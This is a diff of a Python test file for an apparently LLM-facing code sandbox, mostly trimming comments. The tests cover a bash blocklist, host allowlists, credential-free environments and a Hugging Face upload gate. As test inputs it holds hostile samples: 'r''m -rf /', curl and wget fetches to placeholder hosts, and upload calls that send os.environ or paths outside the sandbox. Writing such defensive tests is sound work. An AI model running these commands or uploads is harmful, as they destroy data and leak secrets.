@@ -88,9 +88,7 @@ class TestTrustedHostAllowlist:
         _ok(f"import requests; requests.get({url!r})")
 
     def test_wikipedia_subdomain_passes(self):
-        _ok(
-            'import urllib.request; urllib.request.urlopen("https://m.en.wikipedia.org/wiki/Foo")'
-        )
+        _ok('import urllib.request; urllib.request.urlopen("https://m.en.wikipedia.org/wiki/Foo")')
 
     def test_hf_co_short_form_passes(self):
         _ok('import requests; requests.get("https://hf.co/unsloth/Qwen3.5-4B-GGUF")')
@@ -119,7 +117,7 @@ class TestUntrustedHostBlock:
         )
 
     def test_dynamic_url_not_statically_blocked(self):
-        # Static AST cannot resolve runtime URLs; bash blocklist is the fallback.
+        # Static AST can't resolve runtime URLs; bash blocklist is the fallback.
         _ok('import requests; url = "https://example.com/"; requests.get(url)')
 
 
@@ -221,18 +219,12 @@ class TestUploadDenylist:
         )
 
     def test_plain_post_json_not_blocked(self):
-        _ok(
-            "import requests\n"
-            'requests.post("https://api.weather.gov/lookup", json={"k": "v"})'
-        )
+        _ok("import requests\n" 'requests.post("https://api.weather.gov/lookup", json={"k": "v"})')
 
 
 class TestSandboxEnvIsolation:
-    """The sandbox subprocess env is built from a whitelist, not by stripping.
-
-    Confirm every credential-shaped parent var is absent regardless of how the
-    operator's process is configured. Covers Linux/macOS/WSL/Windows shapes.
-    """
+    """Sandbox env is built from a whitelist, so credential-shaped parent
+    vars stay absent regardless of operator config (Linux/macOS/WSL/Windows)."""
 
     _SECRET_KEYS = (
         # HF + ML tooling
@@ -318,8 +310,8 @@ class TestSandboxEnvIsolation:
     def test_term_is_dumb(self, tmp_path):
         from core.inference.tools import _build_safe_env
 
-        # Prevents the sandbox from re-using the operator's TERM (e.g. xterm-256color)
-        # which could trigger color-escape parsing in downstream tools.
+        # Avoid re-using the operator's TERM (e.g. xterm-256color) that
+        # could trigger color-escape parsing in downstream tools.
         env = _build_safe_env(str(tmp_path))
         assert env["TERM"] == "dumb"
 
@@ -345,22 +337,18 @@ class TestSandboxCpuRlimitDefault:
 
 class TestMaxBodyDefault:
     def test_default_is_500_mb(self):
-        src = (_BACKEND_ROOT / "main.py").read_text()
-        assert 'UNSLOTH_STUDIO_MAX_BODY_MB", "500"' in src
+        src = (_BACKEND_ROOT / "utils" / "upload_limits.py").read_text()
+        assert "DEFAULT_UPLOAD_LIMIT_MB = 500" in src
+        assert "UNSLOTH_STUDIO_MAX_BODY_MB" in src
 
 
 class TestBashBlocklistPosition:
-    """The blocklist must fire at command position only.
-
-    Pre-fix the per-token loop fired on any token, so `grep -r curl .`
-    and `echo source` were rejected. The position-anchored regex plus a
-    shlex-aware command-position-only token check is sufficient.
-    """
+    """The blocklist must fire at command position only, so args like
+    `grep -r curl .` and `echo source` are not falsely rejected."""
 
     @staticmethod
     def _find():
         from core.inference.tools import _find_blocked_commands
-
         return _find_blocked_commands
 
     # ---- argument-position: must NOT be blocked ----
@@ -371,8 +359,7 @@ class TestBashBlocklistPosition:
         assert self._find()("echo source the data") == set()
 
     def test_cat_with_word_source_allowed(self):
-        # The 'source' word is an argument to echo; not blocked.
-        # `echo` itself isn't blocked. Only legit allowed tokens here.
+        # 'source' is an argument to echo, and echo isn't blocked either.
         assert self._find()("cat README.md && echo source") == set()
         assert "source" not in self._find()("cat README.md && echo source")
         assert "echo" not in self._find()("cat README.md && echo source")
@@ -402,14 +389,14 @@ class TestBashBlocklistPosition:
         assert "wget" in self._find()("cd /tmp && wget https://bad")
 
     def test_split_quotes_obfuscation_blocked(self):
-        # shlex collapses 'r''m' -> 'rm' as a single token at command position.
+        # shlex collapses 'r''m' -> 'rm' at command position.
         assert "rm" in self._find()("r''m -rf /")
 
     def test_path_prefixed_command_blocked(self):
         assert "sudo" in self._find()("/usr/bin/sudo whoami")
 
     def test_nested_bash_c_blocked(self):
-        # Recursion into the nested command string still catches command-position curl.
+        # Recursion into the nested command string catches command-position curl.
         assert "curl" in self._find()("bash -c 'curl https://x'")
 
     def test_subshell_command_blocked(self):
@@ -470,9 +457,8 @@ class TestBashBlocklistPosition:
 
 
 class TestHfUploadImportGate:
-    """HfApi-style upload-method blocking should require an HF import in
-    scope; otherwise paramiko / boto3 / internal SDKs with the same
-    method names hit a false positive."""
+    """Upload-method blocking requires an HF import in scope, so paramiko /
+    boto3 / internal SDKs with the same method names don't false-positive."""
 
     def test_paramiko_upload_file_allowed_without_hf_import(self):
         _ok("import paramiko; sftp=None; sftp.upload_file('a','b')")
@@ -481,14 +467,14 @@ class TestHfUploadImportGate:
         _ok("client=None; client.create_commit(Repo='x')")
 
     def test_hf_api_upload_safe_path_allowed(self):
-        # Sandbox-local relative path -- the call shape we want to permit.
+        # Sandbox-local relative path -- the permitted call shape.
         _ok("from huggingface_hub import HfApi; HfApi().upload_file('a','b','c')")
 
     def test_hf_upload_file_fq_safe_path_allowed(self):
         _ok("import huggingface_hub; huggingface_hub.upload_file('a','b','c')")
 
     def test_dynamic_builtin_import_safe_path_allowed(self):
-        # `__import__('huggingface_hub')` puts HF in scope; relative-literal path is safe.
+        # `__import__('huggingface_hub')` puts HF in scope; relative literal is safe.
         _ok("hf=__import__('huggingface_hub'); hf.HfApi().upload_file('a','b','c')")
 
     def test_dynamic_importlib_safe_path_allowed(self):
@@ -504,8 +490,8 @@ class TestHfUploadImportGate:
         )
 
     def test_hf_bare_name_upload_safe_path_allowed(self):
-        # `from huggingface_hub import upload_file` then bare `upload_file(...)`
-        # with a sandbox-local relative-path literal is allowed.
+        # Bare `upload_file(...)` (imported from huggingface_hub) with a
+        # sandbox-local relative-path literal is allowed.
         _ok(
             "from huggingface_hub import upload_file;"
             " upload_file(path_or_fileobj='x', path_in_repo='x', repo_id='r')"
@@ -524,15 +510,14 @@ class TestHfUploadImportGate:
         )
 
     def test_bare_name_upload_file_without_hf_import_allowed(self):
-        # No HF import -- local helper named upload_file should pass.
-        _ok("def upload_file(*a, **k):\n    pass\n" "upload_file('x', 'y', 'z')")
+        # No HF import -- local helper named upload_file passes.
+        _ok("def upload_file(*a, **k):\n    pass\nupload_file('x', 'y', 'z')")
 
 
 class TestHfUploadSandboxLocalPaths:
-    """The HF upload gate must only allow uploads of files that already live in
-    the sandbox workdir. Absolute paths, `..` traversal, home expansion, and
-    Windows drive letters are rejected because the LLM can use them to lift
-    secrets from outside the sandbox."""
+    """HF upload gate allows only files in the sandbox workdir. Absolute paths,
+    `..` traversal, home expansion, and Windows drives are rejected (they could
+    lift secrets from outside the sandbox)."""
 
     def test_relative_literal_allowed(self):
         _ok(
@@ -626,8 +611,8 @@ class TestHfUploadSandboxLocalPaths:
         )
 
     def test_dynamic_variable_path_blocked(self):
-        # A non-literal expression could resolve to any path at runtime;
-        # the static checker cannot prove safety, so block.
+        # A non-literal expr could resolve to any path at runtime; the
+        # static checker can't prove safety, so block.
         _blocked(
             "import huggingface_hub, os\n"
             "p = os.path.join('outputs', 'x.bin')\n"
@@ -679,11 +664,9 @@ class TestHfUploadSandboxLocalPaths:
 
 
 class TestHfUploadEnvAndSecretLeakBlock:
-    """The HF upload gate must reject any positional / keyword arg sourced from
-    `os.environ` / `os.getenv` / subprocess env reads. Even though
-    `_build_safe_env` strips HF_TOKEN/WANDB/AWS upfront for the sandbox shell,
-    a Python script can still reach the parent process env if it bypasses the
-    safe-env wrapper at the source -- so block statically."""
+    """HF upload gate rejects any arg sourced from os.environ / os.getenv /
+    subprocess env reads, since a script can reach the parent env directly
+    despite the safe-env shell wrapper."""
 
     def test_path_from_os_environ_subscript_blocked(self):
         _blocked(
@@ -761,7 +744,7 @@ class TestHfUploadEnvAndSecretLeakBlock:
         )
 
     def test_env_dict_unpacked_via_environ_attr_blocked(self):
-        # `os.environ` as a bare reference (passed somewhere it gets serialized).
+        # Bare `os.environ` reference (passed somewhere it gets serialized).
         _blocked(
             "import huggingface_hub, os\n"
             "huggingface_hub.upload_file(path_or_fileobj=str(os.environ),"
@@ -770,8 +753,8 @@ class TestHfUploadEnvAndSecretLeakBlock:
         )
 
     def test_repo_id_from_env_also_blocked(self):
-        # Even non-path args must not source env vars -- an attacker could
-        # encode secrets in repo_id or path_in_repo.
+        # Non-path args must not source env vars either -- an attacker
+        # could encode secrets in repo_id or path_in_repo.
         _blocked(
             "import huggingface_hub, os\n"
             'huggingface_hub.upload_file(path_or_fileobj="x.bin",'
